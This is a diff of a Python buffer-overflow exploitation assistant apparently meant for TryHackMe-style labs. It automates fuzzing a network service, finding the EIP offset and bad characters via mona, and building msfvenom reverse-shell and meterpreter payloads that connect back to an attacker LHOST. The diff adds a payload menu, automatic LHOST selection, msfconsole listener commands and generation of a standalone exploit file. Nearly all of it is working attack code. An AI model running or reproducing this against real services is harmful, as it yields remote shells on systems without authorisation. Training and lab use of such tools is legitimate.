@@ -1,13 +1,19 @@
 #!/usr/bin/env python3
 import socket, time, sys, os
-
+import netifaces as ni
+import ipaddress
 import pyperclip
+from dill.source import getsource
+
 
 #Terminal color defined
-RED = "\033[0;31m"
-GREEN = "\033[0;32m"
-BLUE = "\033[0;34m"
-END = "\033[0m"
+RED = "\033[0;31m"          # Restart the vulnerable app
+GREEN = "\033[0;32m"        # Text that copies automatically in your clipboard
+BG_BLUE = "\u001b[44;1m"   # PlaceHolder 
+BLUE = "\033[0;34m"         # User Input
+END = "\033[0m"             # To reset the color
+
+###########################################------ INTRO DESIGN ------###########################################
 
 #Headings for each section
 H_fuzz="""
@@ -54,52 +60,108 @@ ______  ___________         ___          _     _              _
 \____/  \___/\_|          \_| |_/___/___/_|___/\__\__,_|_| |_|\__|
                                                                   
                                                                   """)
-    print(GREEN,"My Name is Bofy makes BOF(Buffer-Overflow) Easy made by PakCyberbot")
-    print("You can follow Pakcyberbot on his social media platforms for more informative materials.\nAll SocialMedia links can be found here:",RED,"https://tryhackme.com/p/PakCyberbot",END)
+    print(GREEN+"My Name is Bofy makes BOF(Buffer-Overflow) Easy made by PakCyberbot")
+    print("You can follow Pakcyberbot on his social media platforms for more informative materials.\nAll SocialMedia links can be found here:",RED+"https://tryhackme.com/p/PakCyberbot",END)
     
-    print('\n\nNOTE: You can also modify the exploit(), direct_exploit(), generate_exploit_file() and fuzzer() packet sending block according to your Target Program Input Behaviour')
-
+    print('\n\n NOTE: You can also modify the program_input_handling() packet sending block according to your Target Program Input Behaviour')
+    
     print("\n\nLet's start doing Buffer-Overflow. \nStart your Vulnerable application on other machine in the Immunity Debugger and also setup Mona in it.")
     input("(Press Enter to Continue)\n")
     print("Type the following command in the immunity debugger command to setup the working directory for Mona:\n")
     command = "!mona config -set workingfolder c:\\mona\\%p"
-    print(GREEN,command,END)
+    print(GREEN+command,END)
     pyperclip.copy(command)
     print("I have copied the command in your clipboard too!")
     input("(Press Enter to Continue)\n")
-    print(H_fuzz)
-    print("\nNow Let me do some rough fuzzing to check where the stack overflow error occurs in the program")
 
-
-def fuzzer():
     global prefix
+    prefix = input(BLUE+"If there is any prefix with the input then type it else Leave empty : "+END)
+
+###########################################------ MODIFY ACCORDING TO PROGRAM INPUT ------###########################################
+
+def program_input_handling(s,buffer):
+    s.send(bytes(buffer+'\\r\\n', "latin-1"))
+
+###########################################------ FUZZING ------###########################################
+
+# MANUAL AND AUTOMATIC FUZZING
+def fuzzer():
+    
     global string
     global padding
     padding =""
-    prefix = input(BLUE+"If there is any prefix with the input then type it else Leave empty : "+END)
-    print("OK, now wait for me to respond back to you. After fuzzing")
-    timeout = 5
+    print(H_fuzz)
 
-    string = prefix + "A" * 100
+    fuzz_type = '1'       # 1 for automatic & 2 for manual
+    
+    while fuzz_type:
+        print("""
+Do you want to do?\n
+    [1] Automatic Fuzzing (Default) : Handled by the program through incrementing the 100 bytes in each loop
+    [2] Manual Fuzzing              : You have to give the rough offset value.
+        """)
+
+        fuzz_type = input(BLUE+"Please enter your option: "+END)
+        if fuzz_type == '1' or fuzz_type=='':
+            print('You chose the automatic fuzzing!')
+            fuzz_type = '1'
+            break
+        elif fuzz_type == '2':
+            print('You chose the manual fuzzing!')
+            break
+        elif fuzz_type != '':
+            print("\n****Not Valid Choice, Try again****")
+            continue
+        break
+
+    if fuzz_type == '1':
+        print("\nNow Let me do some rough fuzzing to check where the stack overflow error occurs in the program")
+        print("Wait for me to respond back to you. After fuzzing")
+        string = prefix + "A" * 100
+    
+    timeout = 5
 
     while True:
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                # Manual Fuzzing
+                while True:     # to test for integer input
+                    try: 
+                        if fuzz_type == '2':
+                            rough_offset = int(input(BLUE+"\nEnter the number of bytes as a rough offset : "+END))
+                            string = prefix + 'A' * rough_offset
+                            break
+                        else: 
+                            break
+                    except TypeError:
+                        print('Please Give the input of Integers!')
+                
                 s.settimeout(timeout)
                 s.connect((ip, port))
 
-                # You can modify this block according to your Target Program Input Behaviour
+                
                 s.recv(1024)
                 print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
-                s.send(bytes(string, "latin-1"))
+                
+                program_input_handling(s,string)
+                
+                #s.send(bytes(string+'\r\n', "latin-1"))
                 s.recv(1024)
         except:
             print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+            is_crash = input(BLUE+ 'Is your Application Really Crashed? (Y/n) : '+END)
+            if is_crash.lower() == 'n':
+                continue
             break
-        string += 100 * "A"
-        time.sleep(1)
-    print("\nI found the rough offset of ", len(string) - len(prefix) ," bytes and I hope your vulnerable application got crashed in the immunity\n")
-    print(RED, "Just restart your application in Immunity debugger and we are going further!", END)
+        if fuzz_type == '1':
+            string += 100 * "A"
+            time.sleep(1)
+        elif fuzz_type == '2':
+            print('Your application didn\'t crashed, so please give higher number than your previous one')
+    if fuzz_type == '1':
+        print("\nI found the rough offset of ", len(string) - len(prefix) ," bytes and I hope your vulnerable application got crashed in the immunity\n")
+
+    print(RED+ "Just restart your application in Immunity debugger and we are going further!"+END)
     input("(Press Enter to Continue)\n")
 
 
@@ -111,9 +173,12 @@ def fuzzer():
     print("I added 200 bytes for the safety")
     
     padding = os.popen("/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l "+str(len(string) - len(prefix)+200)).read()
-    print("\n", padding)
+    print("\n", padding)  #To show the output of the command
+    
     print("\nI am going to send this generated payload to the application. I hope you restarted the application.")
     input("(Press Enter to Continue)\n")
+
+###########################################------ BOF ATTACK To create Exploit ------###########################################
 
 def exploit():
     global padding
@@ -133,9 +198,12 @@ def exploit():
         try:
             s.connect((ip, port))
 
-            # You can modify this block according to your Target Program Input Behaviour    
+               
             print("Sending evil buffer...")
-            s.send(bytes(buffer + "\r\n", "latin-1"))
+            
+            program_input_handling(s,buffer)
+            
+            #s.send(bytes(buffer + "\r\n", "latin-1"))
             print("Done!")
         except:
             print("Could not connect.")
@@ -147,7 +215,7 @@ def exploit():
             print("Now I need your interaction to do some task.")
             print("Type the following command in the immunity debugger command to find the exact offset in order to get the EIP address\n")
             command = "!mona findmsp -distance "+str(len(string) - len(prefix) + 200)
-            print(GREEN,command,END)
+            print(GREEN+command,END)
             pyperclip.copy(command)
             print("I have copied the command in your clipboard too!")
             print('\nMona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).')
@@ -157,7 +225,7 @@ def exploit():
             offset = int(input(BLUE+"I helped you alot, Now please tell me the offset of EIP : "+END))
             payload =""
             retn ="BBBB"
-            print(RED,"Ok, Now restart your application so that I can test your offset",END)
+            print(RED+"Ok, Now restart your application so that I can test your offset",END)
             input("(Press Enter to Continue)\n")
        
         if i == 1:
@@ -172,7 +240,7 @@ def exploit():
             # Finding Bad Chars
             print("\nType the following command in the immunity debugger command to find the exact offset in order to get the EIP address\n")
             command = '!mona bytearray -b "\\x00"'
-            print(GREEN,command,END)
+            print(GREEN+command,END)
             pyperclip.copy(command)
             print("I have copied the command in your clipboard too!")
             input("(Press Enter to Continue)\n")
@@ -184,8 +252,8 @@ def exploit():
         if i == 2:
             # Compare both byte array to identify bad chars
             print("Make a note of the address to which the ESP register points and use it in the following mona command:")
-            command = '!mona compare -f C:\\mona\\<ProgramName>\\bytearray.bin -a <address>"'
-            print(GREEN,command,END)
+            command = '!mona compare -f C:\\mona\\'+END+BG_BLUE+'<ProgramName>'+END+GREEN+'\\bytearray.bin -a '+END+BG_BLUE+"<address>"+END
+            print(GREEN+command,END)
             pyperclip.copy("!mona compare -f C:\\mona\\ \\bytearray.bin -a ")
             print("I have copied the command in your clipboard too!")
             print('\nA popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.')
@@ -198,13 +266,13 @@ def exploit():
             # Find the register
             print("\nrun the following mona command, making sure to update the -cpb option with all the badchars you identified(including \\x00)\n")
             command = f'!mona jmp -r esp -cpb "{badchars}"'
-            print(GREEN,command,END)
+            print(GREEN+command,END)
             pyperclip.copy(command)
             print("I have copied the command in your clipboard too!")
             input("(Press Enter to Continue)\n")
             print("\nThe mona find command can similarly be used to find specific instructions, though for the most part, the jmp command is sufficient:\n")
             command = f'!mona find -s \'jmp esp\' -type instr -cm aslr=false,rebase=false,nx=false -cpb "{badchars}"'
-            print(GREEN,command,END)
+            print(GREEN+command,END)
             pyperclip.copy(command)
             print("I have copied the command in your clipboard too!")
             print("This command finds all \"jmp esp\" (or equivalent) instructions with addresses that don't contain any of the badchars specified. The results should display in the \"Log data\" window (use the Window menu to switch to it if needed).")
@@ -215,20 +283,14 @@ def exploit():
             retn = retn.encode('utf-8').decode('unicode_escape')
 
             print(H_exploitatoin)
-            print('\nOk, Now I am using your MsfVenom to generate a reverse shell payload.')
-            LHOST = input(BLUE+'Give your LHOST= '+END)
-            LPORT = input(BLUE+'Give your LPORT= '+END)
-            print("I am using the following command to generate the pattern, I will also show the pattern to you")
-            print(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c")
-            print("\nMsfVenom payload takes sometime to generate till now you can start your netcat listener on another terminal")
             
-            payload = os.popen(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
-            print("\n", payload)
+            payload = MSF_payloads(badchars)
+            
             payload = (payload.encode('utf-8').decode('unicode_escape'))
 
-            print(RED, 'Now Restart your application for last time.', END)
+            print(RED+ 'Now Restart your application for last time.', END)
             padding = "\x90" * 16
-            input("(Press Enter to Continue)\n\n")
+            input("Whenever Your Listener started, Press enter to send the exploit Payload")
         # Ending message
         if i == 3:
             print('Wait for few seconds to get reverse shell!')
@@ -248,8 +310,10 @@ def exploit():
                 print('\n-e/--exploit : to directly exploit the program if you know the values')
             else:
                 generate_exploit_file(buffer, LPORT)
-            input(RED+"(Press Enter to Continue)\n"+END)
+            input("(Press Enter to Continue)\n")
             sys.exit()
+
+###########################################------ DIRECT EXPLOITATION ------###########################################
 
 # You can directly exploit the application if you know the values already.
 
@@ -265,15 +329,8 @@ def direct_exploit():
     
     retn = input(BLUE+"ESP register address(For example if the address is \\x01\\x02\\x03\\x04 in Immunity, write it as \\x04\\x03\\x02\\x01) : "+END)
     retn = retn.encode('utf-8').decode('unicode_escape')
-    
-    print('\nOk, Now I am using your MsfVenom to generate a reverse shell payload.')
-    LHOST = input(BLUE+'Give your LHOST= '+END)
-    LPORT = input(BLUE+'Give your LPORT= '+END)
-    print("I am using the following command to generate the pattern, I will also show the pattern to you")
-    print(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c")
-    print("\nMsfVenom payload takes sometime to generate till now you can start your netcat listener on another terminal")
-    
-    payload = os.popen(f"msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
+     
+    payload = MSF_payloads(badchars)
     
     payload = (payload.encode('utf-8').decode('unicode_escape'))
     padding = "\x90" * 16
@@ -289,16 +346,21 @@ def direct_exploit():
         print('python3 BOF-Assistant.py <IP> <PORT> [-e/--exploit]')
         print('\n-e/--exploit : to directly exploit the program if you know the values')
 
+    input("Whenever Your Listener started, Press enter to send the exploit Payload")
     try:
         s.connect((ip, port))
         print("Sending evil buffer...")
-        # You can modify this block according to your Target Program Input Behaviour    
-        s.send(bytes(buffer + "\r\n", "latin-1"))
+
+        program_input_handling(s,buffer)
+        
+        #s.send(bytes(buffer + "\r\n", "latin-1"))
         s.close()
         print("Done!")
     except Exception as e:
         print(e)
         print("Could not connect.")
+
+###########################################------ GENERATING PORTABLE PYTHON EXPLOIT ------###########################################
 
 def generate_exploit_file(exploit_payload, LPORT):
     exploit_payload = exploit_payload.replace('\\','\\\\')
@@ -307,22 +369,31 @@ def generate_exploit_file(exploit_payload, LPORT):
     with open(exp_fileName+'.py', 'w') as f:
         f.write(f"""
 import sys,socket
-
+import pyperclip
+{getsource(program_input_handling)}
 if len(sys.argv) == 3:
     buffer = {exploit_payload.encode('latin-1')}
     buffer = buffer.decode('unicode_escape')
+    GREEN = {GREEN.encode('latin-1')}
+    GREEN = GREEN.decode('unicode_escape')
+    END = {END.encode('latin-1')}
+    END = END.decode('unicode_escape')
     try:
         ip = sys.argv[1]
         port = int(sys.argv[2])
         print('Start the listener at PORT : '+ str({LPORT}))
-        input('(Press Enter to Continue)')
+        cmd_4_listener = f'msfconsole -q -x "use exploit/multi/handler; set payload {p_type}; set LHOST {LHOST}; set LPORT {LPORT};exploit"'
+        print(GREEN+cmd_4_listener,END)
+        pyperclip.copy(cmd_4_listener)
+        print("I have copied the command in your clipboard too!")
+        input('(Press Enter to Continue) After Starting the Listener')
         #Just to check connection
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((ip, port))
             print("Sending evil buffer...")
             
-            # You can modify this block according to your Target Program Input Behaviour    
-            s.send(bytes(buffer + "\\r\\n", "latin-1"))
+            program_input_handling(s,buffer)
+            
             s.close()
             print("Done!")
 
@@ -333,8 +404,106 @@ if len(sys.argv) == 3:
 else:
     print(f'python3 \x7bsys.argv[0]\x7d <IP> <PORT>')
         """)
-    print(f'I have generated file {exp_fileName}.py for you.\n Simply type python3 {exp_fileName}.py <TargetIP> <TargetPort> to exploit it')
+    print(f'I have generated file {exp_fileName}.py for you.\nSimply type python3 {exp_fileName}.py <TargetIP> <TargetPort> to exploit it')
 
+
+###########################################------ USING DIFFERENT MSF PAYLOADS ------###########################################
+
+def MSF_payloads(badchars):
+    opt_payload = '1'
+    global p_type
+    p_type =  "windows/shell_reverse_tcp"
+    while opt_payload:
+        print("""
+Which payload do you want to generate?\n
+    [1] windows/shell_reverse_tcp (Default)
+    [2] linux/x86/shell_reverse_tcp 
+    [3] windows/meterpreter/reverse_tcp
+    [4] linux/x86/meterpreter/reverse_tcp 
+    """)
+        opt_payload= input(BLUE+"Please enter your option: "+END)
+        if opt_payload == '1':
+            p_type =  "windows/shell_reverse_tcp"
+            break
+        elif opt_payload == '2':
+            p_type =  "linux/x86/shell_reverse_tcp"
+            break
+        elif opt_payload == '3':
+            p_type =  "windows/meterpreter/reverse_tcp"
+            break
+        elif opt_payload == '4':
+            p_type =  "linux/x86/meterpreter/reverse_tcp"
+            break
+        elif opt_payload != "":
+            print("\n****Not Valid Choice, Try again****")
+
+    print(f'\nOk, Now I am using your MsfVenom to generate a {p_type} payload.')
+    global LHOST
+    LHOST = lhost_ip()
+    global LPORT
+    LPORT = input(BLUE+'Give your LPORT= '+END)
+    print("I am using the following command to generate the payload")
+    print(f"msfvenom -p {p_type} LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c")
+    print("\nMsfVenom payload takes sometime to generate till now you can start your listener on another terminal")
+    
+    cmd_4_listener = f'msfconsole -q -x "use exploit/multi/handler; set payload {p_type}; set LHOST {LHOST}; set LPORT {LPORT};exploit"'
+    print(GREEN+cmd_4_listener,END)
+    pyperclip.copy(cmd_4_listener)
+    print("I have copied the command in your clipboard too!")
+    return os.popen(f"msfvenom -p {p_type} LHOST={LHOST} LPORT={LPORT} EXITFUNC=thread -b \"{badchars}\" -f c | grep -oe  '\"[\\\\0-9a-z]*\"' | tr -d '\"' | tr -d \"\\n\"").read()
+
+###########################################------ CHOOSING LHOST IP ------###########################################
+
+def lhost_ip():
+    ans = True
+    while ans:
+        print("""
+What network is the machine you are exploiting on?\n
+    [1] Local Network Loopback: "lo"
+    [2] Ethernet Interface 0:   "eth0"
+    [3] Try Hack Me Network:    "tun0"
+    [4] Custom:                 "User Specified IP"
+    """)
+        ans = input(BLUE+ "Please enter your option: " + END)
+        if ans == "1":
+            ni.ifaddresses('lo')
+            LHOST = ni.ifaddresses('lo')[ni.AF_INET][0]['addr']
+            print("\nLocal IP Address set as: ", LHOST)
+            time.sleep(2)
+            break
+        elif ans == "2":
+            ni.ifaddresses('eth0')
+            LHOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+            print("\nLocal IP Address set as: ", LHOST)
+            time.sleep(2)
+            break
+        elif ans == "3":
+            ni.ifaddresses('tun0')
+            LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+            print("\nLocal IP Address set as: ", LHOST)
+            time.sleep(2)
+            break
+        elif ans == "4":
+            while True:
+                try:
+                    LHOST = ipaddress.ip_address(
+                        input(BLUE+ '\nPlease Enter the Custom IP address of your local mahine on the network: '+END))
+                    break
+                except ValueError:
+                    print('\nYou entered an invalid IP Adress, please try again... ')
+                    time.sleep(2)
+
+            print("\nLocal IP Address set as: ", LHOST)
+            break
+        elif ans != "":
+            print("\n****Not Valid Choice, Try again****")
+            time.sleep(2)
+            print("\nWhat would you like to do?")
+    return LHOST
+
+
+
+###########################################------ MAIN FUNCTION ------###########################################
 
 if __name__ == "__main__":
     global ip
@@ -355,6 +524,8 @@ if __name__ == "__main__":
             sys.exit(0)
         
         intro()
+
+        
         fuzzer()        
         exploit()
     if len(sys.argv) > 3:
@@ -372,6 +543,8 @@ if __name__ == "__main__":
                 sys.exit(0)
             direct_exploit()
     else:
+        ###########################################------ HELP ------###########################################
+
         print('python3 BOF-Assistant.py <IP> <PORT> [-e/--exploit]')
         print('\n-e/--exploit : to directly exploit the program if you know the values')
-        print('\n\n NOTE: You can also modify the exploit(), direct_exploit(), generate_exploit_file() and fuzzer() packet sending block according to your Target Program Input Behaviour')
+        print('\n\n NOTE: You can also modify the program_input_handling() packet sending block according to your Target Program Input Behaviour')
